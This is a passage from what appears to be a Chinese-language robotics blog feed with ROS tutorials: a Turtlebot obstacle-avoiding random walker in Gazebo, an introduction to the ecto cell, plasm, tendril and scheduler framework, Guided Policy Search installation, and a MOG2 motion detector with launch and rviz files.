&lt;arg name=&quot;use_sim_time&quot; value=&quot;true&quot;/&gt;    &lt;arg name=&quot;debug&quot; value=&quot;false&quot;/&gt;    &lt;arg name=&quot;gui&quot; value=&quot;$(arg gui)&quot; /&gt;    &lt;arg name=&quot;world_name&quot; value=&quot;$(arg world_file)&quot;/&gt;  &lt;/include&gt;  &lt;node name=&quot;spawn_turtlebot_model&quot; pkg=&quot;gazebo_ros&quot; type=&quot;spawn_model&quot; args=&quot;$(optenv ROBOT_INITIAL_POSE) -unpause -urdf -param robot_description -model turtlebot&quot; respawn=&quot;false&quot; output=&quot;screen&quot;/&gt;    &lt;node pkg=&quot;robot_state_publisher&quot; type=&quot;robot_state_publisher&quot; name=&quot;robot_state_publisher&quot;&gt;	  &lt;param name=&quot;publish_frequency&quot; type=&quot;double&quot; value=&quot;30.0&quot; /&gt;  &lt;/node&gt;    &lt;!-- Fake laser --&gt;  &lt;node pkg=&quot;nodelet&quot; type=&quot;nodelet&quot; name=&quot;laserscan_nodelet_manager&quot; args=&quot;manager&quot;/&gt;  &lt;node pkg=&quot;nodelet&quot; type=&quot;nodelet&quot; name=&quot;depthimage_to_laserscan&quot;        args=&quot;load depthimage_to_laserscan/DepthImageToLaserScanNodelet laserscan_nodelet_manager&quot;&gt;    &lt;param name=&quot;scan_height&quot; value=&quot;10&quot;/&gt;    &lt;param name=&quot;output_frame_id&quot; value=&quot;/camera_depth_frame&quot;/&gt;    &lt;param name=&quot;range_min&quot; value=&quot;0.45&quot;/&gt;    &lt;remap from=&quot;image&quot; to=&quot;/camera/depth/image_raw&quot;/&gt;    &lt;remap from=&quot;scan&quot; to=&quot;/scan&quot;/&gt;  &lt;/node&gt;&lt;/launch&gt;

啟動之後的模擬環境如下：

實作避障演算法有了模擬環境跟機器人後，接下來就是要實作控制機器人行為的演算法啦。這邊用到的演算法很簡單，程式碼也就不長:
#!/usr/bin/env pythonimport rospyfrom geometry_msgs.msg import Twistfrom sensor_msgs.msg import LaserScanranges = []def callback(data):    global ranges    ranges = data.ranges    # (data.angle_max - data.angle_min)/data.angle_increment: 638.99    # len(data.ranges):640def random_walker():    pub = rospy.Publisher(&#x27;/mobile_base/commands/velocity&#x27;, Twist, queue_size=10)    sub = rospy.Subscriber(&#x27;/scan&#x27;, LaserScan, callback)    rospy.init_node(&#x27;turtlebot_random_exploration_node&#x27;)    rate = rospy.Rate(10)    cmd = Twist()    while not rospy.is_shutdown():        #data.range_min == 0, can be ignored in this case        global ranges        distance_smaller_than_thres = [i for i in ranges if i &lt;= 0.5]        if( len(distance_smaller_than_thres) &gt; 0):            cmd.linear.x = 0            cmd.angular.z = 0.5                        pub.publish(cmd)            rate = rospy.Rate(1)            rate.sleep()        else:            cmd.linear.x = 0.1            cmd.angular.z = 0            pub.publish(cmd)            rate = rospy.Rate(10)            rate.sleep()if __name__ == &#x27;__main__&#x27;:    try:        random_walker()    except rospy.ROSInterruptException:        pass

主要控制機器人移動的函式是 random_walker() ，一進入這個函式，就會先初始化送出移動命令的 publisher ，也會初始化接收 laser data 的 subscriber，只要一收到新的 laser data 就會呼叫 callback() 函式更新 range 這個全域變數，這邊就要稍微解釋一下 LaserScan 這個 msg 了。
基本上，因為 LaserScan 這種資料結構太常用，所以 ROS 官方提供的 sensor_msgs package 裡面就已經包含了 LaserScan.msg，它的定義在網路上很容易找到：

可以看到裡面包含了許多資訊，例如收到 data 的最小角度和最大角度、回傳得到的距離資訊等等，我們這邊只單純用到距離資訊，所以只用到 ranges 的資料就夠了。
所以在 random_walker() 的 while 迴圈裡面，就是不斷地去判斷 ranges 裡面的距離有沒有小於 0.5 公尺的，如果有，就讓機器人停下來原地旋轉；如果沒有，那就讓機器人繼續往前進。夠簡單了吧。
要執行的話，因為我剛好已經有一個現成的 repository 可以用，所以可以直接載來玩：
cd catkin_ws/srcgit clone https://github.com/Po-Jen/sd-ros-class.gitcd .. &amp; catkin_makesource devel/setup.bashroslaunch assignment3 gazebo_random_walker_and_gmapping.launch

如果你成功跑起來，應該可以看到 Turtlebot 在 Gazebo 裡面緩慢地移動。我還順便加上了 gmapping 的 node，所以應該可以在 Rviz 看到建立出來的地圖。

總結這周教大家寫一個簡單的避障機器人，可以根據 laser data 判斷機器人附近有沒有障礙物，只要障礙物太過靠近就停下來轉個方向，雖然概念很簡單，不過對於入門的讀者來說，要實作出來也是需要思考一下，希望這篇文章可以變成踏腳石，讓想玩移動機器人的讀者可以上手。
延伸閱讀
掃地機器人算法的一些想法和測試
Robot exploration algorithm

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, Robot, ROS, Turtlebot, Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>ecto 簡介 (1) – cell 與 plasm</title>
    <url>/2016/06/08/ros-ecto-first/</url>
    <content><![CDATA[前言這次想要跟大家介紹 ROS ORK (Object Recognition Kitchen) 這個函式庫實作物體辨識 pipeline 的機制，其背後運用到的一個重要的函式庫叫做 ecto ，接下來會介紹 ecto 的基本觀念和用法。但因為我想把內容講解得比較詳細，所以不會只花一篇文章的篇幅就介紹完這個工具，這一篇會講到最基本的 cell 與 plasm，讓大家先有初步的認識，更進階的用法甚至是實例會在之後的文章介紹。
ecto 是什麼 &amp; 為什麼要使用 ecto可以把 ecto 想成一個框架，這個框架可以讓你很方便地把程式用 DAG (Directed Acyclic Graph) 的方式來實作，這樣實作的兩大好處在於模組化跟彈性。
DAG的一個範例圖：

首先談到模組化，在 ecto 的世界裡，你首先可以用 C++ 或 Python 寫出一個個的 cell ，這個 cell 就是執行一個功能的單位 (所以命名為 cell，細胞的意思)，這種設計的方式讓你在撰寫 cell 的時候，比較不會把好多個功能硬寫在一起，增加了程式的可讀性、也讓後續的擴充彈性變強。
模組化所衍生出的好處就是彈性，因為你只要抽換某個模組，就可以改變整個程式的行為。
以 ORK 為例，在撰寫物體辨識的 pipeline 時，假設有三個步驟: (這邊只是為了方便理解舉例，不是真實情況)

讀取 Kinect 影像
使用 Linemod 演算法進行 template matching
將辨識結果輸出

那用 ecto 實作就會寫成三個 cells，然後再建立一個 ecto 的 plasm，plasm 其實就只是 graph，把寫好的三個cell相連接。 所以，如果我想要實作另一個物體辨識的演算法，我只要改寫第二個 cell 就好，當然有個前提是兩個演算法的 input 和 output 要一致，才不會影響到第一個和第三個 cell。
基本中的基本 – Cells &amp; Plasm 的簡單用法為了讓大家有見樹又見林的感覺，我們先看一下 ecto 大致上要怎麼用。最簡單的用法大概就是建立兩個 cell ，再用一個 plasm 將這兩個 cell 串成 graph 。
現在我們只要先知道要寫一個 cell 需要在裡面定義四個函式: 
static voiddeclare_params(tendrils&amp;)static voiddeclare_io(const tendrils&amp;, tendrils&amp;, tendrils&amp;)voidconfigure(const tendrils&amp;, const tendrils&amp;, const tendrils&amp;)intprocess(const tendrils&amp;, const tendrils&amp;)

這四個函式顧名思義就是要定義這個 cell 有哪些參數可以設定、輸入跟輸出是什麼、怎麼設定參數以及 cell 運作時的功能，很符合直覺上的需求。
那假設我們已經定義了兩個 cell – MyAwesomeCell1 跟 MyAwesomeCell2，ru, 剩下的就是建立一個 Plasm 來串接這兩個 cell 並執行，他的程式碼會像這樣:
#!/usr/bin/env pythonimport ectoimport my_awesome_cpp_ecto_moduleimport my_awesome_python_ecto_module # create a plasmplasm = ecto.Plasm() # create some cellscell1 = my_awesome_cpp_ecto_module.MyAwesomeCell1(param1=whatever1)cell2 = my_awesome_python_ecto_module.MyAwesomeCell2(param2=whatever2) # connect those cells in the plasmplasm.connect(cell1[&#x27;output&#x27;] &gt;&gt; cell2[&#x27;input&#x27;]) # execute the graphplasm.execute(niter=2)

重點其實只有 Plasm 的初始化、串接 cell 成 graph 與執行這三個部分:
# create a plasmplasm = ecto.Plasm() # connect those cells in the plasmplasm.connect(cell1[&#x27;output&#x27;] &gt;&gt; cell2[&#x27;input&#x27;]) # execute the graphplasm.execute(niter=2)

Cell 的機制詳解從上面的例子，大家應該可以明顯的看出，plasm 因為只是要串連寫好的 cell ，所以設定相對單純(目前我們先不討論 scheduling 等複雜的狀況)，但 cell 就不太一樣，上面只提到需要寫四個函式，卻沒有實例讓大家了解怎麼實作，接下來就會介紹比較實際的例子，讓大家了解 cell 要怎麼寫。
首先我們看個簡單的例子，這個 class 是一個 Printer ，我們在產生這個 Printer 的 instance 時，可以設定裡面的兩個 data member – prefix_ 和 suffix_ (或可以理解成參數)
struct Printer&#123;  Printer(const std::string&amp; prefix, const std::string&amp; suffix)      :        prefix_(prefix),        suffix_(suffix)  &#123;  &#125;  void  operator()(std::ostream&amp; out, const std::string&amp; message)  &#123;    out &lt;&lt; prefix_ &lt;&lt; message &lt;&lt; suffix_;  &#125;  std::string prefix_, suffix_;&#125;;

假設要改寫成 ecto 的 cell，首先我們來宣告參數，透過 declare_params 這個函式可以做到，在這個例子裡，只是先單純宣告有兩個 params，提供這兩個參數的說明(這個說明可以用來自動生成文件，不過我們先忽略)，以及預設值。
大家可能會疑惑的地方是，params.declare 這個用法怎麼突然就跑出來了。這是因為在 ecto 裡面，cell 之間的溝通是透過 tendrils 這個類別來處理，但這一篇先不提到 tendrils 的細節，所以才會有點混亂，不過如果去看 tendrils 的 API，就會清楚這中間是怎麼一回事。
static voiddeclare_params(tendrils&amp; params)&#123;  params.declare&lt;std::string&gt;(&quot;prefix&quot;, &quot;A string to prefix printing with.&quot;, &quot;start&gt;&gt; &quot;);  params.declare&lt;std::string&gt;(&quot;suffix&quot;, &quot;A string to append printing with.&quot;, &quot; &lt;&lt;stop\n&quot;);&#125;

接著我們來定義 IO 的介面，透過 declare_io 來做，因為這個 cell 只需要接收需要印出的 message ，所以只需要宣告一個 input ，不需要宣告 output 。
static voiddeclare_io(const tendrils&amp; params, tendrils&amp; inputs, tendrils&amp; outputs)&#123;  inputs.declare&lt;std::string&gt;(&quot;message&quot;, &quot;The message to print.&quot;);&#125;

目前我們已經指定了對外的兩個重點 – 有哪些參數以及 IO 介面。接著該考慮內部使用的設定了，所以第一步是將 declare_params 裡面宣告的參數 (此例中是 prefix 跟 suffix) 跟類別裡面的 data member (此例中是 prefix_ 跟 suffix_) 連接。
voidconfigure(const tendrils&amp; params, const tendrils&amp; inputs, const tendrils&amp; outputs)&#123;  params[&quot;prefix&quot;] &gt;&gt; prefix_;  params[&quot;suffix&quot;] &gt;&gt; suffix_;&#125;

最後的重點就是，實作這個 cell 的功能，我們要把實際做的事情寫在 process 這個函式裡面。
intprocess(const tendrils&amp; inputs, const tendrils&amp; outputs)&#123;  std::cout &lt;&lt; prefix_ &lt;&lt; inputs.get&lt;std::string&gt;(&quot;message&quot;) &lt;&lt; suffix_;  return ecto::OK;&#125;

所以如果把四個函式合起來看，就會像這樣:
#include &lt;ecto/ecto.hpp&gt;#include &lt;ecto/registry.hpp&gt;#include &lt;iostream&gt;#include &lt;string&gt;using ecto::tendrils;namespace overview&#123;  struct Printer01  &#123;    static void    declare_params(tendrils&amp; params)    &#123;      params.declare&lt;std::string&gt;(&quot;prefix&quot;, &quot;A string to prefix printing with.&quot;, &quot;start&gt;&gt; &quot;);      params.declare&lt;std::string&gt;(&quot;suffix&quot;, &quot;A string to append printing with.&quot;, &quot; &lt;&lt;stop\n&quot;);    &#125;    static void    declare_io(const tendrils&amp; params, tendrils&amp; inputs, tendrils&amp; outputs)    &#123;      inputs.declare&lt;std::string&gt;(&quot;message&quot;, &quot;The message to print.&quot;);    &#125;    void    configure(const tendrils&amp; params, const tendrils&amp; inputs, const tendrils&amp; outputs)    &#123;      params[&quot;prefix&quot;] &gt;&gt; prefix_;      params[&quot;suffix&quot;] &gt;&gt; suffix_;    &#125;    int    process(const tendrils&amp; inputs, const tendrils&amp; outputs)    &#123;      std::cout &lt;&lt; prefix_ &lt;&lt; inputs.get&lt;std::string&gt;(&quot;message&quot;) &lt;&lt; suffix_;      return ecto::OK;    &#125;    std::string prefix_, suffix_;  &#125;;&#125;ECTO_CELL(ecto_overview, overview::Printer01, &quot;Printer01&quot;,          &quot;A simple stdout printer with prefix and suffix parameters.&quot;);

雖然整個類別被寫成很長，但其實只要熟悉 cell 的基本用法，就不會被這一堆程式碼嚇到。最後想跟大加補充說明一下，上面提到的 cell 寫法有個不直覺的地方是，沒有明顯的繼承關係，所以會覺得不符合我們的 cell 應該要繼承一個 base 的 cell class 的直覺。其實這邊是被 ECTO_CELL 這個 Macro 給處理掉了，所以才會看起來只有宣告幾個函式就寫完一個 cell 的感覺。
總結這篇文章簡介了 ecto 的 cell 和 plasm，下一篇將會介紹 tendril 跟 scheduler 的機制，幫助大家更加理解 ecto ，並在未來能運用這個框架來建立自己的應用。
延伸閱讀
When to use DAG (Directed Acyclic Graph) in programming?
ecto 官方網頁的 plasm 介紹
ecto 官方網頁的 cell 詳細介紹

]]></content>
      <tags>
        <tag>ROS, ecto</tag>
      </tags>
  </entry>
  <entry>
    <title>Guided Policy Search 環境安裝</title>
    <url>/2017/12/02/ros-gps-install-intro/</url>
    <content><![CDATA[前言Guided Policy Search (GPS) 是一個滿酷的 policy search 方法，接下來我們會來介紹這個 package 的安裝還有啟動方法，讓大家好入個門。如果你不太了解什麼是 policy 跟 policy search，可以看看 這篇文章。
因為核心的安裝方法在網頁上已經寫得滿清楚，所以這篇文章主要是側重在幫大家整合一些可能需要的資源（因為安裝過程中可能會遇到一些問題）。
安裝方法首先，要先安裝一些基本的 dependency，這個可以直接參考 GPS 的網頁。需要有 python, caffe&#x2F;Tensorflow 等等東西，網路上都有很多資源了，就不再贅述。
接下來，要 clone GPS 的 package：
git clone https://github.com/cbfinn/gps.git

然後就是去執行設定：
cd gps./compile_proto.sh

如果你在安裝完畢後有遇到其他問題，你可以看看 這個 issue，或者也可以看 這個 issue，應該就可以 cover 大部分遇到的問題了！
啟動 GPS這個 package 裡面已經提供了幾種測試環境，Box 2D、Mujoco 跟 Gazebo PR2，因為個人覺得 PR2 比較大隻，可以做到更複雜的任務，所以就講一下怎麼啟動 PR2 的範例。
一開始要先啟動 Gazebo 跟弄出一隻 PR2：
roslaunch gps_agent_pkg pr2_gazebo.launch

這一步你如果碰到問題，可以參考 這篇文章。
接下來是啟動 Guided Policy Search：
python python/gps/gps_main.py pr2_example

跑起來之後應該就會看到如下的視窗，然後 Gazebo 裡面的 PR2 會開始動，Window 中也會開始顯示訓練時的軌跡資料：

接下來就會看到 PR2 的左手一直在進行嘗試，這些嘗試是為了讓 PR2 的左手可以到達目標位置：

達到目標之後，GPS 的視窗就會顯示如下：

下一步是什麼？下一步就看你想要拿 GPS 來做什麼實驗，你可以套用自己的機器人、設計自己的實驗等等，或是以目前的環境為起點完全弄懂 GPS 的實作細節，有滿多東西可以延伸的。
總結今天跟大家介紹了 Guided Policy Search 的環境安裝跟基本概念，主要是想幫助有興趣的讀者可以減輕入門的環境安裝門檻，更詳細的演算法概念可以參考 深入淺出 End-to-End Learning on Robotics，或你也可以去看 Guided Policy Search 的論文，會幫助你對演算法本身更加了解。
延伸閱讀
深入淺出 End-to-End Learning on Robotics

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>ROS, Guided Policy Search, Reinforcement Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>ecto 簡介 (2) – tendrils 與 scheduler</title>
    <url>/2016/07/09/ros-ecto-second/</url>
    <content><![CDATA[前言上次的文章介紹了 ecto 的基本機制 – cell 與 plasm，讓大家對於這個函式庫的基本功能有了一個認識，但你可能會感到疑惑，如果只是可以用來建立一個如 DAG 方式來執行的 pipeline ，寫在 main 函式裡不就好了，何苦使用 ecto，還得把一個 class 寫成一個又臭又長的 cell。這篇文章就會帶出 tendril 和 scheduler 的機制，讓大家了解到事情並不像我們想得那麼簡單。
tendril 是什麼 &amp; tendril 好用在哪裡tendril 這個 object 就是 cell 最基本的溝通媒介，舉凡 cell 的輸入、輸出以及 parameter 的傳遞都會使用到 tendril 。在上一篇我們也可以看到，cell 的函式定義裡面，都是使用 tendril 這個型態來傳遞參數。
struct Example01 &#123;  static void declare_params(tendrils&amp; p)  &#123;    p.declare&lt;int&gt;(&quot;value&quot;, &quot;Some integer&quot;);  &#125;  void configure(const tendrils&amp; p, const tendrils&amp; i, const tendrils&amp; o)  &#123;    int n = p.get&lt;int&gt;(&quot;value&quot;);    std::cout &lt;&lt; &quot;Value of n is &quot; &lt;&lt; n &lt;&lt; &quot;\n&quot;;  &#125;&#125;;

使用起來只要寫一小段 Python Script 就好：
#!/usr/bin/python import ectofrom ecto.ecto_examples import Example01 ecell = Example01(value=17)ecell.process()

那統一寫成 tendril 的好處是什麼呢? 統一的好處很直觀，就是很容易被廣泛地使用，舉例來說，如果我們今天要寫一個 scheduler 來控制整個 plasm 的排程，那每個 cell 的參數、輸入和輸出都統一用 tendril 在實作上會比較簡單。舉個例子，cell 的 process(const tendrils&amp;, const tendrils&amp;)就一定是固定有兩個 const 的 tendrils 類型的引數，不會被使用者任意自訂。
這邊還有另一個容易讓人搞混的地方，就是 tendril 跟 tendrils 的差異，這兩個東西是不一樣的，tendrils 可以想成是一個裝著 tendril 的容器，可以給 tendril 的名字，這個名字會被當作一個 key （型態自然就是 string），用來對應到 tendril 的物件。
Scheduler 是什麼Scheduler 是幫忙控制 plasm 執行的工具，比較酷的是 ecto.MultiPlasmScheduler 這個類別，他可以讓我們輕鬆地平行執行多個 plasm ，例如我們有三個 plasm 要執行，且三個想要執行的頻率不一樣，那使用 MultiPlasmScheduler 可以透過設定 step 的大小來控制頻率。

自己如果想實作，那就要跟 multi-threads 奮戰，中間細致的控制滿容易出錯的，如果 thread 一多，debug更是困難。
ecto 可以讓我們從比較上層的角度來控制多個 plasm ，有看到一個 test script 是使用 MultiPlasmScheduler 來執行兩個 thread，跟上面的範例圖不一樣，不過概念是相近的：
#!/usr/bin/env python## Copyright (c) 2011, Willow Garage, Inc.# All rights reserved.## Redistribution and use in source and binary forms, with or without# modification, are permitted provided that the following conditions are met:#     * Redistributions of source code must retain the above copyright#       notice, this list of conditions and the following disclaimer.#     * Redistributions in binary form must reproduce the above copyright#       notice, this list of conditions and the following disclaimer in the#       documentation and/or other materials provided with the distribution.#     * Neither the name of the Willow Garage, Inc. nor the names of its#       contributors may be used to endorse or promote products derived from#       this software without specific prior written permission.## THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE# POSSIBILITY OF SUCH DAMAGE.#import ectoimport ecto.ecto_test as ecto_testimport sysfrom ecto.test import testdef build_pipelines():    left_plasm = ecto.Plasm()    right_plasm = ecto.Plasm()    accumulator = ecto_test.Accumulator(&quot;Accumulator&quot;, connected_inputs_only=True)    left_generator = ecto_test.Generate(&quot;Left Generator&quot;, step=1.0, start=1.0, stop=10.0)    right_generator = ecto_test.Generate(&quot;Right Generator&quot;, step=2.0, start=1.0, stop=10.0)    left_plasm.connect(left_generator[&quot;out&quot;] &gt;&gt; accumulator[&quot;left&quot;])    right_plasm.connect(right_generator[&quot;out&quot;] &gt;&gt; accumulator[&quot;right&quot;])    plasms = &#123;          &quot;left&quot;: left_plasm,          &quot;right&quot;: right_plasm         &#125;    scheduler = ecto.MultiPlasmScheduler(plasms, disable_qt_management=True)    return (accumulator, scheduler)@testdef test_plasm():    (accumulator, scheduler) = build_pipelines()    scheduler.spin()    print( &quot;RESULT: %s&quot; % accumulator.outputs.out)    assert accumulator.outputs.out == 80.0if __name__ == &#x27;__main__&#x27;:    test_plasm()

但是這一塊的 API 跟教學文章很不完整，要深入了解可能要看撰寫 ecto 的這些高手們怎麼把 ecto 用在 OpenCV、PCL 等開源的電腦視覺函式庫中，之後的文章會更深入探討。
總結這一篇文章簡單跟大家介紹了 tendril 跟 scheduler 的概念，對於 ecto 的功能及彈性更加有感覺，不過看完這一篇可能還不太知道要怎麼活用 ecto，下一篇會帶大家實際來玩玩這個工具，會更通 ecto 可以做到的事跟實際應用的範例。
延伸閱讀
ecto 官方網頁的 tendril 介紹
ecto 官方網頁的 scheduler 介紹

]]></content>
      <tags>
        <tag>ROS, ecto</tag>
      </tags>
  </entry>
  <entry>
    <title>接收來自 ROS Topic 的影像並偵測畫面中的動作</title>
    <url>/2016/11/26/ros-motion-detector/</url>
    <content><![CDATA[前言這次來帶大家玩個基礎的應用 - 動作偵測,用自己筆電的相機再加上 OpenCV 的 API，就可以做到動作偵測並把在動的地方框起來。可以透過這篇學習怎麼使用 ROS Topic 來接收影像並做後續的處理。
開 package 寫程式首先來開一個 motion_detector package:
catkin_create_pkg motion_detector rospy sensor_msgs cv_bridge usb_cam\cd motion_detectorvim src/motion_detector.py

程式碼長這樣，裡面主要是用到 OpenCV 的 MOG2 這個前背景分類的工具，切出來的前景就用一個框框來表示。
#!/usr/bin/env pythonimport rospyimport cv2import numpy as npfrom cv_bridge import CvBridge, CvBridgeErrorfrom sensor_msgs.msg import Imagekernel_elliptic_7 = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (7, 7))kernel_elliptic_15 = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (15, 15))area_threshold = 2000class MOG2:  def __init__(self):    self.fgbg = cv2.BackgroundSubtractorMOG2(history=150, varThreshold=500, bShadowDetection=True)  def detect(self,image):    fgmask = self.fgbg.apply(image)    cv2.morphologyEx(fgmask, cv2.MORPH_CLOSE, kernel_elliptic_7, dst=fgmask)    cv2.morphologyEx(fgmask, cv2.MORPH_OPEN, kernel_elliptic_15, dst=fgmask)    contours = cv2.findContours(fgmask.astype(np.uint8), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)    area_box = ((cv2.contourArea(contour), cv2.boundingRect(contour)) for contour in contours[0])    area_box = [(area, box) for (area, box) in area_box if area &gt; area_threshold]    area_box.sort(reverse=True)    bounding_boxes = [((x, y), (x+w, y+h)) for _, (x, y, w, h) in area_box[:5]]    for p1, p2 in bounding_boxes:        cv2.rectangle(image, p1, p2, (0, 255, 0), 2)    return image    #return fgmask #for param tuningclass Motion:    def __init__(self):        rospy.init_node(&quot;motion_detector_node&quot;)        self.bridge = CvBridge()        self.pub = rospy.Publisher(&#x27;camera/visible/image&#x27;, Image, queue_size=2)        rospy.Subscriber(&quot;usb_cam/image_raw&quot;, Image, self.imageCallback)        self.motion_detector = MOG2()        rospy.spin()    def imageCallback(self, image):        if self.motion_detector:            cv_image = self.bridge.imgmsg_to_cv2(image, &quot;bgr8&quot;)            result_img = self.motion_detector.detect(cv_image)            image = self.bridge.cv2_to_imgmsg(result_img, &quot;bgr8&quot;)            #image = self.bridge.cv2_to_imgmsg(result_img, &quot;mono8&quot;) #for param tuning        self.pub.publish(image)if __name__ == &#x27;__main__&#x27;:    detector = Motion()

執行程式先把程式變成可執行的 node，接着來寫個 launch file 方便執行：
chmod +x src/motion_detector.pymkdir launchvim launch/motion_detection.launch

&lt;launch&gt;  &lt;!-- Launch the motion detector node for image processing. --&gt;  &lt;node pkg=&quot;motion_detector&quot; name=&quot;MotionDetector&quot; type=&quot;motion_detector.py&quot;/&gt;  &lt;!-- Launch the driver node for our usb camera. --&gt;  &lt;node name=&quot;usb_cam&quot; pkg=&quot;usb_cam&quot; type=&quot;usb_cam_node&quot; output=&quot;screen&quot; &gt;   &lt;param name=&quot;video_device&quot; value=&quot;/dev/video0&quot; /&gt;   &lt;param name=&quot;image_width&quot; value=&quot;640&quot; /&gt;   &lt;param name=&quot;image_height&quot; value=&quot;480&quot; /&gt;   &lt;param name=&quot;pixel_format&quot; value=&quot;yuyv&quot; /&gt;   &lt;param name=&quot;camera_frame_id&quot; value=&quot;usb_cam&quot; /&gt;   &lt;param name=&quot;io_method&quot; value=&quot;mmap&quot;/&gt;  &lt;/node&gt;  &lt;node name=&quot;rviz&quot; pkg=&quot;rviz&quot; type=&quot;rviz&quot; required=&quot;true&quot;       args=&quot;-d $(find motion_detector)/rviz/motion.rviz&quot; /&gt;&lt;/launch&gt;

這邊想順便教大家一個技巧，你可以把 rviz 的檔案先寫好，這樣每次重新啓動 Rviz 就很方便，不用重新選想要看的資料類型。
vim rviz/motion.rviz

其實這個檔案可以直接從 Rviz 存出來，或是你也可以很 hardcore 地自己寫XD
Panels:  - Class: rviz/Displays    Help Height: 78    Name: Displays    Property Tree Widget:      Expanded:        - /Global Options1        - /Status1        - /Image1      Splitter Ratio: 0.5    Tree Height: 387  - Class: rviz/Selection    Name: Selection  - Class: rviz/Tool Properties    Expanded:      - /2D Pose Estimate1      - /2D Nav Goal1      - /Publish Point1    Name: Tool Properties    Splitter Ratio: 0.588679  - Class: rviz/Views    Expanded:      - /Current View1    Name: Views    Splitter Ratio: 0.5  - Class: rviz/Time    Experimental: false    Name: Time    SyncMode: 0    SyncSource: ImageVisualization Manager:  Class: &quot;&quot;  Displays:    - Alpha: 0.5      Cell Size: 1      Class: rviz/Grid      Color: 160; 160; 164      Enabled: true      Line Style:        Line Width: 0.03        Value: Lines      Name: Grid      Normal Cell Count: 0      Offset:        X: 0        Y: 0        Z: 0      Plane: XY      Plane Cell Count: 10      Reference Frame: &lt;Fixed Frame&gt;      Value: true    - Class: rviz/Image      Enabled: true      Image Topic: /camera/visible/image      Max Value: 1      Median window: 5      Min Value: 0      Name: Image      Normalize Range: true      Queue Size: 2      Transport Hint: raw      Unreliable: false      Value: true  Enabled: true  Global Options:    Background Color: 48; 48; 48    Fixed Frame: map    Frame Rate: 30  Name: root  Tools:    - Class: rviz/Interact      Hide Inactive Objects: true    - Class: rviz/MoveCamera    - Class: rviz/Select    - Class: rviz/FocusCamera    - Class: rviz/Measure    - Class: rviz/SetInitialPose      Topic: /initialpose    - Class: rviz/SetGoal      Topic: /move_base_simple/goal    - Class: rviz/PublishPoint      Single click: true      Topic: /clicked_point  Value: true  Views:    Current:      Class: rviz/Orbit      Distance: 10      Enable Stereo Rendering:        Stereo Eye Separation: 0.06        Stereo Focal Distance: 1        Swap Stereo Eyes: false        Value: false      Focal Point:        X: 0        Y: 0        Z: 0      Name: Current View      Near Clip Distance: 0.01      Pitch: 0.785398      Target Frame: &lt;Fixed Frame&gt;      Value: Orbit (rviz)      Yaw: 0.785398    Saved: ~Window Geometry:  Displays:    collapsed: false  Height: 668  Hide Left Dock: false  Hide Right Dock: false  Image:    collapsed: false  QMainWindow State: 000000ff00000000fd00000004000000000000016a00000212fc0200000008fb0000001200530065006c0065006300740069006f006e00000001e10000009b0000006400fffffffb0000001e0054006f006f006c002000500072006f007000650072007400690065007302000001ed000001df00000185000000a3fb000000120056006900650077007300200054006f006f02000001df000002110000018500000122fb000000200054006f006f006c002000500072006f0070006500720074006900650073003203000002880000011d000002210000017afb000000100044006900730070006c006100790073010000002800000212000000dd00fffffffb0000002000730065006c0065006300740069006f006e00200062007500660066006500720200000138000000aa0000023a00000294fb00000014005700690064006500530074006500720065006f02000000e6000000d2000003ee0000030bfb0000000c004b0069006e0065006300740200000186000001060000030c00000261000000010000010f00000212fc0200000003fb0000001e0054006f006f006c002000500072006f00700065007200740069006500730100000041000000780000000000000000fb0000000a00560069006500770073010000002800000212000000b000fffffffb0000001200530065006c0065006300740069006f006e010000025a000000b2000000000000000000000002000004b0000000a9fc0100000002fb0000000a0049006d006100670065030000014b0000009700000287000001a3fb0000000a00560069006500770073030000004e00000080000002e10000019700000003000004b00000003efc0100000002fb0000000800540069006d00650100000000000004b0000002f600fffffffb0000000800540069006d006501000000000000045000000000000000000000022b0000021200000004000000040000000800000008fc0000000100000002000000010000000a0054006f006f006c00730100000000ffffffff0000000000000000  Selection:    collapsed: false  Time:    collapsed: false  Tool Properties:    collapsed: false  Views:    collapsed: false  Width: 1200  X: 55  Y: 14

執行結果roslaunch motion_detector motion_detection.launch

用上面的指令跑起來之後，就可以看到在動的東西被框框圈起來啦！

延伸閱讀
ROS 跟 OpenCV 串接的工具 - cv_bridge
用 Optical Flow 來偵測動作

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, ROS, 動作偵測, OpenCV, Mixture of Gaussian</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Object Recognition Kitchen 的 Linemod 演算法辨識物體</title>
    <url>/2016/05/14/ros-object-recognition-kitchen/</url>
    <content><![CDATA[前言這次要介紹的工具是 ROS 裡面專門用來作物體辨識的 Object Recognition Kitchen (以下簡稱為 ORK )，這個工具比較像是一個框架，裡面包含了好幾種演算法(你可以根據自己的需求使用不同的演算法)，這篇文章要介紹的只是其中一種 – Linemod 。 Linemod 是一個辨識效果很不錯的 3D 物體辨識演算法(不過一個使用條件是物體須是剛體)，所以想藉此機會分享給大家，以後只要你想要，就可以直接拿這個工具來串自己的機器人應用。
